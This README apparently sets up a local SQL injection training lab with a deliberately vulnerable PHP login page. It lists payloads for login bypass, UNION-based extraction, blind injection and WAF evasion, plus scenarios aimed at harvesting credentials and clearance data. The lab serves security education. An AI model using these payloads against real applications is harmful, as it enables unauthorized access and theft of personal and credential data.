# 🎯 H&F Tactical SQL Injection Testing Environment

## 📋 Setup Instructions

### **1. Install MySQL/MariaDB**
```bash
# On Kali Linux
sudo apt update
sudo apt install mariadb-server mariadb-client

# Start MySQL service
sudo systemctl start mariadb
sudo systemctl enable mariadb

# Secure installation (optional)
sudo mysql_secure_installation
```

### **2. Create Database**
```bash
# Login to MySQL
sudo mysql -u root -p

# Create database and user
CREATE DATABASE hf_tactical;
CREATE USER 'hf_user'@'localhost' IDENTIFIED BY 'hf_password';
GRANT ALL PRIVILEGES ON hf_tactical.* TO 'hf_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

### **3. Import Database**
```bash
# Import the SQL file
mysql -u root -p hf_tactical < logs/hf_tactical_database.sql
```

### **4. Install PHP and Apache (for vulnerable web app)**
```bash
# Install LAMP stack
sudo apt install apache2 php php-mysql

# Start Apache
sudo systemctl start apache2
sudo systemctl enable apache2

# Copy PHP file to web directory
sudo cp logs/vulnerable_login.php /var/www/html/
sudo chown www-data:www-data /var/www/html/vulnerable_login.php
```

### **5. Access the Vulnerable Application**
- **URL**: http://localhost/vulnerable_login.php
- **Database**: hf_tactical
- **Test credentials**: admin / admin123

## 🔓 SQL Injection Testing Targets

### **1. Login Bypass**
**Target**: Username field in login form
**Payloads**:
```sql
admin' OR '1'='1' --
admin' OR '1'='1' #
' OR 1=1 --
admin' OR 'x'='x
```

### **2. Data Extraction (UNION-based)**
**Target**: Username field
**Payloads**:
```sql
admin' UNION SELECT username,password,email,role,security_clearance,null,null,null,null,null FROM users --
admin' UNION SELECT customer_id,organization_name,contact_person,email,security_clearance,null,null,null,null,null FROM customers --
admin' UNION SELECT product_id,product_name,category,price,security_clearance_required,null,null,null,null,null FROM product_inventory WHERE restricted_item=1 --
```

### **3. Search Function Injection**
**Target**: Customer search field
**Payloads**:
```sql
FBI' UNION SELECT customer_id,organization_name,contact_person,email,security_clearance,total_purchases,null,null,null,null,null,null,null FROM customers --
' OR 1=1 --
' OR security_clearance='TS/SCI' --
```

### **4. Error-based Injection**
**Payloads**:
```sql
admin' AND (SELECT COUNT(*) FROM users)>0 --
admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```

### **5. Time-based Blind Injection**
**Payloads**:
```sql
admin' AND (SELECT SLEEP(5)) --
admin' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --
```

## 📊 Database Structure

### **Tables Available**:
- `users` - Login credentials (8 users)
- `employees` - Employee records (5 employees)
- `customers` - Customer database (5 customers)
- `product_inventory` - Tactical products (6 products)
- `sales_records` - Sales transactions (5 orders)
- `network_logs` - Network access logs (10 entries)

### **High-Value Targets**:
- **Classified products** with TS/SCI clearance requirements
- **Customer data** with security clearances
- **Employee SSN** last 4 digits
- **Sales data** with government contracts

## 🎯 Practice Scenarios

### **Scenario 1: Credential Harvesting**
Extract all usernames and passwords from the users table.

### **Scenario 2: Customer Intelligence**
Extract all customers with Top Secret or TS/SCI clearances.

### **Scenario 3: Product Information**
Extract all restricted/classified products and their prices.

### **Scenario 4: Employee Data**
Extract employee contact information and security clearances.

### **Scenario 5: Financial Intelligence**
Extract high-value sales records and customer purchase totals.

## 🛡️ Detection Evasion

### **WAF Bypass Techniques**:
```sql
-- Comment variations
admin'/**/OR/**/'1'='1'/**/--
admin'/*comment*/OR/*comment*/'1'='1'--

-- Case variations
Admin' Or '1'='1' --
ADMIN' OR '1'='1' --

-- Encoding
admin%27%20OR%20%271%27%3D%271%27%20--

-- Alternative operators
admin' || '1'='1' --
admin' | '1'='1' --
```

## ⚠️ Ethical Usage

This environment is designed for:
- ✅ **Authorized penetration testing**
- ✅ **Security education and training**
- ✅ **SQL injection skill development**
- ✅ **Defensive security research**

**Never use these techniques against systems you don't own or lack explicit permission to test.**

## 🔧 Troubleshooting

### **Common Issues**:

**MySQL Connection Error**:
- Check if MySQL service is running: `sudo systemctl status mariadb`
- Verify credentials in vulnerable_login.php

**PHP Errors**:
- Check Apache error log: `sudo tail -f /var/log/apache2/error.log`
- Ensure PHP MySQL extension is installed: `sudo apt install php-mysql`

**Permission Denied**:
- Set proper file permissions: `sudo chmod 644 /var/www/html/vulnerable_login.php`

---
**Happy SQL Injection Testing! 🎯**
